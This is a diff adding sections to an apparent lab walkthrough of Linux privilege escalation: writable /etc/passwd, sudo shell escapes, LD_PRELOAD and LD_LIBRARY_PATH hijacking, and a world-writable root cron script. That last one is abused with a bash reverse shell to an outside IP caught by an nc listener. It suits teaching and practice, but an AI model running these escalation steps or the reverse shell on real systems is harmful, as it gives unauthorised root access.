@@ -138,7 +138,7 @@ When the MySQL service runs as root, there may be an exploit you can take advant
     ```
 # Task 4 - Weak File Permissions - Writable /etc/shadow
 If the /etc/shadow file is writeable, you can create a new password hash with a password of your choosing, and overwrite an existing one
-* Generate a new password
+* Generate a new password hash with mkpasswd
     ```
     user@debian:~$ mkpasswd -m sha-512 cool
     $6$SrDC5MGFC.3uMi$MW1nLHduoLKd1C85/5n0a85rZwKhcTQivbI.4/D.lSBZToHNjOFEmS0cVKnq54MOVrTj4/LEilbr2ACMJMAl60
@@ -150,3 +150,140 @@ If the /etc/shadow file is writeable, you can create a new password hash with a 
     Password: 
     root@debian:/home/user#     
     ```
+# Task 5 - Weak File Permissions - Writable /etc/passwd
+If the /etc/passwd file is writable on some versions of Linux it will function in the same way as /etc/shadow
+* Generate a new password hash with openssl
+    ```
+    user@debian:~$ openssl passwd nice
+    bHIth8gtHu2OA    
+    ```
+* Edit the /etc/passwd file and place the hash in between the first and second colon for the root user
+    ```
+    user@debian:~$ vim /etc/passwd
+    user@debian:~$ su root
+    Password: 
+    root@debian:/home/user# 
+    ```
+# Task 6 - Sudo - Shell Escape Sequences
+You can use a combination of sudo -l and GTFOBins to find vulnerable applications to escalate privilege
+* List sudo permissions
+    ```
+    user@debian:~$ sudo -l
+    Matching Defaults entries for user on this host:
+        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+    User user may run the following commands on this host:
+        (root) NOPASSWD: /usr/sbin/iftop
+        (root) NOPASSWD: /usr/bin/find
+        (root) NOPASSWD: /usr/bin/nano
+        (root) NOPASSWD: /usr/bin/vim
+        (root) NOPASSWD: /usr/bin/man
+        (root) NOPASSWD: /usr/bin/awk
+        (root) NOPASSWD: /usr/bin/less
+        (root) NOPASSWD: /usr/bin/ftp
+        (root) NOPASSWD: /usr/bin/nmap
+        (root) NOPASSWD: /usr/sbin/apache2
+        (root) NOPASSWD: /bin/more
+    ```
+* Research these applications using GTFOBins
+    ```
+    https://gtfobins.github.io/
+    ```
+# Task 7 - Sudo - Environment Variables
+Sudo can inherit environment variables
+* Check which environment variables are inherited
+    ```
+    user@debian:~$ sudo -l
+    Matching Defaults entries for user on this host:
+        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH  <------
+
+    User user may run the following commands on this host:
+        (root) NOPASSWD: /usr/sbin/iftop
+        (root) NOPASSWD: /usr/bin/find
+        (root) NOPASSWD: /usr/bin/nano
+        (root) NOPASSWD: /usr/bin/vim
+        (root) NOPASSWD: /usr/bin/man
+        (root) NOPASSWD: /usr/bin/awk
+        (root) NOPASSWD: /usr/bin/less
+        (root) NOPASSWD: /usr/bin/ftp
+        (root) NOPASSWD: /usr/bin/nmap
+        (root) NOPASSWD: /usr/sbin/apache2
+        (root) NOPASSWD: /bin/more
+    ```
+* LD_PRELOAD loads a shared object before a program loads, LD_LIBRARY_PATH is a list of directories where shared libraries are searched first
+* Create a shared object and then set the preload and run one of the available sudo commands from above, a root shell should spawn
+    ```
+    user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+    user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so less
+    root@debian:/home/user# 
+    ```
+* Check shared libraries for apache2
+    ```
+    user@debian:~$ ldd /usr/sbin/apache2
+            linux-vdso.so.1 =>  (0x00007fff8e645000)
+            libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8896400000)
+            libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f88961dc000)
+            libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f8895fa2000)
+            libpthread.so.0 => /lib/libpthread.so.0 (0x00007f8895d86000)
+            libc.so.6 => /lib/libc.so.6 (0x00007f8895a1a000)
+            libuuid.so.1 => /lib/libuuid.so.1 (0x00007f8895815000)
+            librt.so.1 => /lib/librt.so.1 (0x00007f889560d000)
+            libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f88953d6000)
+            libdl.so.2 => /lib/libdl.so.2 (0x00007f88951d1000)
+            libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f8894fa9000)
+            /lib64/ld-linux-x86-64.so.2 (0x00007f88968bd000)
+    ```
+* Create a shared library with the same name as one listed above and then set the library path and run apache2 with sudo
+    ```
+    user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
+    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
+    root@debian:/home/user# exit
+    ```
+# Task 8 - Cron Jobs - File Permissions
+Cron jobs are liked scheduled tasks in Windows, they system wide schedule is located in /etc/crontab
+* Look at the scheduled tasks
+    ```
+    user@debian:~$ cat /etc/crontab
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don't have to run the `crontab'
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+
+    SHELL=/bin/sh
+    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    #
+    * * * * * root overwrite.sh
+    * * * * * root /usr/local/bin/compress.sh
+    ```
+* Review the permissions of overwrite.sh which is run every minute by root
+    ```
+    user@debian:~$ locate overwrite.sh
+    locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 257.5 days)
+    /usr/local/bin/overwrite.sh
+    user@debian:~$ ls -lrta /usr/local/bin/overwrite.sh 
+    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+    ```
+* Since overwrite.sh is writable by anyone, you can make changes to it and the next time it executes it will be done so as if run by root
+    ```
+    nc -nvlp 1234
+    listening on [any] 1234 ...
+
+    user@debian:~$ echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
+    user@debian:~$ echo 'bash -i >& /dev/tcp/10.14.4.14/1234 0>&1' >> /usr/local/bin/overwrite.sh
+    user@debian:~$     
+
+    connect to [10.14.4.14] from (UNKNOWN) [10.10.73.156] 43907
+    bash: no job control in this shell
+    root@debian:~# whoami
+    whoami
+    root    
+    ```
+# Task 9 - Cron Jobs - PATH Environment Variable
